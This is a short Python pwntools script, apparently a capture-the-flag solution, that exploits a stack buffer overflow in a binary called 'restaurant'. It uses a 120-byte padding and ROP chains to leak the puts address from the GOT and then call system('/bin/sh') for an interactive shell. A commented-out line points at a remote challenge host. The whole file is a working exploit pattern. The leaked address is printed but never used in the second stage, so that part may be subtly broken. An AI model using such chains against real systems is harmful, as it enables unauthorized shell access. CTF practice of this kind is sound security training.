from pwn import *


binary = "restaurant"
context(os="linux", arch="amd64")
context.log_level = "error"
context.binary = binary
elf = ELF(binary)
rop = ROP(binary)


# p = connect("34.159.62.47", 30736)
p = process(binary)

p.sendline("3".encode())

offset = 120
JUNK = b"A" * offset
main = elf.symbols["main"]
got_puts = elf.got["puts"]
plt_puts = elf.plt["puts"]
POP_RDI = rop.find_gadget(["pop rdi", "ret"])[0]
payload = JUNK + p64(POP_RDI) + p64(got_puts) + p64(plt_puts) + p64(main)
p.sendline(payload)

p.recvuntil(b"to eat:")
leaked_puts = p.recvline().strip()
leaked_puts = int.from_bytes(leaked_puts, "little")


print(f"Puts: {leaked_puts}")
BINSH = next(elf.search(b"/bin/sh\x00"))
SYSTEM = elf.sym["system"]
EXIT = elf.sym["exit"]

p.sendline("3".encode())
payload = JUNK + p64(POP_RDI) + p64(BINSH) + p64(SYSTEM) + p64(EXIT)
p.sendline(payload)

p.interactive()
